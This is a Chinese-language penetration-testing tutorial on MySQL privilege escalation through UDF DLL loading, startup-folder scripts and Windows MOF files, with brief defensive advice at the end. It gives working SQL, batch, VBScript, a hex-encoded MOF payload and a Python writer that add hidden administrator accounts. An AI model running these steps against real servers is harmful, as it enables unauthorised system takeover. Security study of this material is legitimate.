---
title: "MySQL提权"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# MySQL提权

mysql的权限提升通常可以两种：

* UDF提权（常用）
* 写文件提权
  * 启动项提权
  * mof提权

## 一、UDF提权

#### UDF

全称为user defined function，用户自定义函数

用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数

#### UDF提权的作用

渗透过程中，拿下一台低权限的主机shell（尤其是windows）时，有些操作无法进行，而此时本地恰好存在mysql数据库，且mysql是root权限 (windows中mysql一般都是管理员权限)，就可以通过新建管理员用户等操作实现提权即udf提权，也可以称为通过mysql获得管理员权限

#### 动态链接库

动态链接库：是把程序代码中会使用的函数编译成机器码，保存在.dll文件中。在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用

**注**：在linux中对应为so文件

#### 利用条件以及数据库版本问题

获得一个mysql数据库账号（最好是root），拥有insert、delete权限，拥有将xxx.dll写入相对应目录的权限

查看版本：

~~~mysql
select version();
~~~

查看secure-file-priv是否有目录限制，执行：

~~~mysql
show global variables like "secure%";
~~~

* 当secure_file_priv 的值为 NULL ，表示限制mysqld 不允许导入|导出，无法进行提权
* 当secure_file_priv 的值为 c:/ ，表示限制 mysqld 的导入|导出只能发生在c盘目录下，无法进行提权
* 当 secure_file_priv的值没有具体值时，表示不对 mysqld 的导入|导出做限制，可以提权

查看plugin目录是否存在：

~~~mysql
select @@plugin_dir;
#或
show variables like 'plugin%';
~~~

udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：

| 版本               | 路径                                                         |
| ------------------ | ------------------------------------------------------------ |
| MySQL < 5.0        | 导出路径随意                                                 |
| 5.0 <= MySQL < 5.1 | 需要导出至目标服务器的系统目录（如：C:\windows\system32\）   |
| 5.1 < MySQL        | 必须导出到MySQL安装目录下的`lib\plugin`目录下（高版本mysql默认不存在`lib\plugin`目录，需要自己创建） |

版本大于5.1的时候，`lib\plugin`文件夹的创建方法：

~~~mysql
select @@basedir;
#查找到mysql的目录
 
select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';
#利用NTFS ADS创建lib目录
 
select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
#利用NTFS ADS创建plugin目录
~~~

#### udf文件的获取与上传

很多现成的udf文件，不需要自己构造：

- 从sqlmap中获取
  sqlmap中的udf文件为了防止误杀进行了异或处理，需要利用sqlmap自带的解码脚本

  ~~~shell
  python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_  -o lib_mysqludf_sys.dll
  #win
  
  python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_  -o lib_mysqludf_sys.so
  #linux
  ~~~

- 从msf中获取

  `/usr/share/metasploit-framework/data/exploits/mysql`，直接cp出来就可以，不需要解码

  使用MSF中的`exploit/multi/mysql/mysql_udf_payload`模块也可以进行UDF提权,MSF会将dll写入lib\plugin\目录下(前提是目录存在,如果目录不存在,则不能成功),DLL文件可以取任意的名字,该dll文件包含sys_exec()和sys_eval()两个函数.但是默认只创建sys_exec()函数,该函数执行并不会有回显,我们可以手工创建sys_eval()函数,来执行有回显的命令

- 国光师傅的博客：https://www.sqlsec.com/udf/

得到udf文件后，可利用webshell上传或者hex编码上传（这里只是举例，实际上，上传的方式有很多，步骤多变，应当视情况而定）:

* 创建一张临时表用来存放DLL/SO文件的十六进制内容

  ~~~mysql
  CREATE TABLE temp_udf(udf blob);
  ~~~

* 插入

  转化成十六进制方法很多这里我们使用mysql

  ~~~mysql
  select hex(load_file('C:/udf,dll')) into dumpfile 'c:/udf.txt';
  ~~~

  **注**：outfile导出文件会在末尾写入新行且转义换行符,破坏二进制文件结构,dumpfile不会进行任何操作 

* 插入

  其中$binaryCode为已经转换好的十六进制内容,$binarycode前加0X

  ~~~mysql
  INSERT into temp_udf values (CONVERT($binaryCode,CHRA));
  ~~~

* 导出

  将udf文件导出至对应位置：

  ~~~mysql
  SELECT * FROM temp_udf INTO DUMPFILE "/usr/lib64/mysql/plugins/udf.so";
  ~~~

  **注**:此时如果出现了错误Can't create/write to file是因为没有lib/plugin目录into dumpfile也不能创建文件夹所以报错

#### 使用udf.dll

udf常用函数：

~~~mysql
sys_eval，执行任意命令，并将输出返回。

sys_exec，执行任意命令，并将退出码返回。

sys_get，获取一个环境变量。

sys_set，创建或修改一个环境变量。
~~~

假设我的udf文件名为‘udf.dll’，且已经上传到了mysql检索目录中，接下来只需要引入即可

~~~mysql
# 实例
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
~~~

只有两个变量，一个是function_name（函数名），我们想引入的函数是sys_eval。还有一个变量是shared_library_name（共享包名称），即‘xxx.dll’。

可以查看是否添加成功：

~~~mysql
select * from mysql.func;
~~~

至此便成功引入了sys_eval函数，用于在mysql中执行系统命令：

~~~mysql
select sys_eval('whoami');
~~~

如果要卸载该函数：

~~~mysql
drop function sys_eval;
~~~

#### 实操

了解基本原理和流程后，接下来用实际操作熟悉一下具体的利用手法

* **vulnhub-Raven:2**：具体操作见我另一篇文章：[vulnhub-Raven:2 渗透记录](https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/vulnhub-raven2%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/)

## 二、写文件提权

写文件提权针对于windows系统，基本上就是使用MySQL的outfile或dumpfile函数，向windows特定目录中写入文件来以被动的方式提权，所以这样提权的前提是**secure_file_priv**变量设置为空

### 1.启动项提权

#### 原理

windows开机时候都会有一些开机启动的程序，用户启动项会以当前登录用户的权限运行，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的

MySQL的启动项提权，原理就是通过mysql把一段bat或vbs脚本导入到系统的启动项文件夹中，如果管理员启动或者重启的服务器，那么该脚本就会被调用，并执行脚本里面的命令（创建管理员账户），实现权限提升

#### 上传脚本

getshell后，查看服务器上系统盘的可读可写目录，若是启动目录 “C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup” 是可读可写的，我们就可以执行上传一个vbs或者bat的脚本：

* bat执行的基础命令：

  ~~~bat
  @echo off
  net user test1 Q!w2e3r4 /add
  net localgroup administrators test1 /add
  ~~~

* vbs执行的基础命令：

  ~~~vbscript
  set wshshell=createobject("wscript.shell")
  a=wshshell.run("cmd.exe /c net user ttt Q!w2e3r4 /add",0)
  b=wshshell.run("cmd.exe /c net localgroup administrators ttt /add",0)
  ~~~

  或

  ~~~vbscript
  set wsnetwork=CreateObject("WSCRIPT.NETWORK") 
  os="WinNT://"&wsnetwork.ComputerName 
  Set ob=GetObject(os) '得到adsi接口,绑定 
  Set oe=GetObject(os&"/Administrators,group") '属性,admin组 
  Set od=ob.Create("user","test1") '建立用户 
  od.SetPassword "Q!w2e3r4" '设置密码 
  od.SetInfo '保存 
  Set of=GetObject(os&"/test1",user) '得到用户 
  oe.add os&"/test1" 
  ~~~

上面脚本作用是：

1.  创建一个用户名为 `test1`、密码为 `Q!w2e3r4` 的用户帐户
2.  将该用户帐户添加到本地管理员组，赋予该用户管理员权限

值得一提的是：bat脚本在启动运行时会有明显的DOS窗口弹出来，而VBS脚本则可以完全隐藏窗口且不会有错误提示，也可以写一句完成脚本后自动删除此脚本的语句

#### 写入启动项

上传后直接mysql语句写入即可：

* 连接到对方MYSQL 服务器

* 进入test数据库，这个数据库一般情况下没有表

直接写：

~~~mysql
select load_file("C:/www/vbs.txt") into dumpfile "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/test.bat";
~~~

接下来只要服务器重启，即可提权成功（通常我们会主动去重启服务器，利用远程溢出（Ms12-020）或社工手法等）

### 2.MOF提权

#### MOF

托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。在windows 2003及更低版本windows中，nullevt.mof文件存储在`c:/windows/system32/wbem/mof/`目录下，windows系统每隔五秒就会以system权限执行一次该文件，去监控进程创建和死亡，执行成功会移动到该目录下的good文件夹，执行失败移动到bad文件夹

#### 原理

对mof文件进行利用，修改此文件，将其中一部份vbs代码替换为后门代码或添加管理员用户的命令后，使用dumpfile函数导入`c:/windows/system32/wbem/mof/`文件夹，系统再次执行该文件即可完成权限提升

#### 利用条件

mof提权需要在system32文件夹下写文件，条件较为严苛：

* windows 2003及以下版本

* mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录

* secure_file_priv参数不为null

#### 利用

添加管理员用户的vbs脚本如下：

~~~vbscript
#pragma namespace("\\\\.\\root\\subscription") 
instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 
instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user Yuy0ung admin123 /add\")"; 
}; 
instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
~~~

在添加用户之后，还需要将用户加入本地管理员组，将脚本中的`net.exe user Yuy0ung admin123 /add\`换成：

~~~shell
net localgroup Administrators Yuy0ung /add
~~~

脚本文件的上传思路与udf提权类似，大概三种：

* 直接上传然后dumpfile

  ~~~mysql
  select load_file("C:/test.mof") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"
  ~~~

* 直接将脚本的16进制编码dumpfile

  ~~~mysql
  select 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e2229200a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c746572200a7b200a202020204576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b200a202020204e616d6520203d202266696c745032223b200a202020205175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e742022200a20202020202020202020202022576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c222022200a20202020202020202020202022416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b200a2020202051756572794c616e6775616765203d202257514c223b200a7d3b200a0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d6572200a7b200a202020204e616d65203d2022636f6e735043535632223b200a20202020536372697074696e67456e67696e65203d20224a536372697074223b200a2020202053637269707454657874203d200a202020202276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e65786520757365722061646d696e2061646d696e202f6164645c2229223b200a7d3b200a0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e67200a7b200a20202020436f6e73756d65722020203d2024436f6e73756d65723b200a2020202046696c746572203d20244576656e7446696c7465723b200a7d3b into dumpfile 'C:/windows/system32/wbem/mof/nullevt.mof';
  ~~~

* 数据库允许远程链接的情况下可以使用py写入

  ~~~python
  #Python3
  
  import MySQLdb
  
  conn=MySQLdb.connect(host="192.168.111.6",user="root",passwd="root") 
  
  payload = r'''
  #pragma namespace("\\\\.\\root\\subscription")
  instance of __EventFilter as $EventFilter
   {
   EventNamespace = "Root\\Cimv2";
   Name = "filtP2";
   Query = "Select * From __InstanceModificationEvent "
   "Where TargetInstance Isa \"Win32_LocalTime\" "
   "And TargetInstance.Second = 5";
   QueryLanguage = "WQL";
   };
  
  instance of ActiveScriptEventConsumer as $Consumer
   {
   Name = "consPCSV2";
   ScriptingEngine = "JScript";
   ScriptText =
   "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user xxxx xxx /add\")";
   };
  
  instance of __FilterToConsumerBinding
   {
   Consumer = $Consumer;
   Filter = $EventFilter;
   };
  '''
  
  ascii_payload = ''
  
  for each_chr in payload:
      ascii_payload += str(ord(each_chr)) + ','
  
  ascii_payload = ascii_payload[:-1]
  
  cur = conn.cursor()
  sql = "select char(%s) into dumpfile 'C:/windows/system32/wbem/mof/nullevt.mof'" % ascii_payload
  
  cur.execute(sql)
  conn.close()
  ~~~

#### 注意事项

服务器会每五秒会循环执行之前的mof文件中的内容，在服务器被mof提权后，需要解决系统继续运行恶意代码的问题：

~~~powershell
net stop winmgmt
#停止winmgmt服务
rmdir /q /s c:\windows\system32\wbem\repository
#删除存储库备份
del /f /s c:\windows\system32\wbem\mof\good\nullevt.mof
#删除mof文件
net start winmgmt
#重启winmgmt服务
~~~

## 三、针对MySQL提权的防御手段

从上面提到的提权过程可以知道，这些权限提升基本都是mysql的配置不当导致的，因此，可以有如下防御措施：

* 降低数据库服务启动用户的权限
* 如果非必要，可以删除插件目录或限制插件目录的权限
* 正确配置secure_file_priv变量
